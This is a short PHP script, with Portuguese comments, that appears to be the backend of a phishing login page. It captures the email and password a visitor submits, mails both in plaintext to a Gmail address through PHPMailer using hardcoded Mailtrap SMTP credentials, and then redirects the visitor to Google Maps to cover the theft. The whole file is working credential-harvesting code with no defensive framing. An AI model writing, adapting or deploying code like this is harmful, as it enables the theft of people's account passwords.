<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require '../vendor/autoload.php'; // Caminho atualizado

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $mail = new PHPMailer(true);

    try {
        //Configurações do servidor
        $mail->isSMTP();
        $mail->Host = 'smtp.mailtrap.io';
        $mail->SMTPAuth = true;
        $mail->Username = '9a85fb5eab83ca';
        $mail->Password = '8658069f8a2ec5';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 2525;

        //Destinatários
        $mail->setFrom('no-reply@example.com', 'Mailer');
        $mail->addAddress('laboratorioganso@gmail.com');

        //Conteúdo
        $mail->isHTML(true);
        $mail->Subject = 'Novo Login';
        $mail->Body    = 'E-mail: ' . $email . '<br>Senha: ' . $password;

        $mail->send();
        header("Location: https://maps.google.com");
        exit();
    } catch (Exception $e) {
        echo "Erro ao enviar o e-mail: {$mail->ErrorInfo}";
    }
}
?>
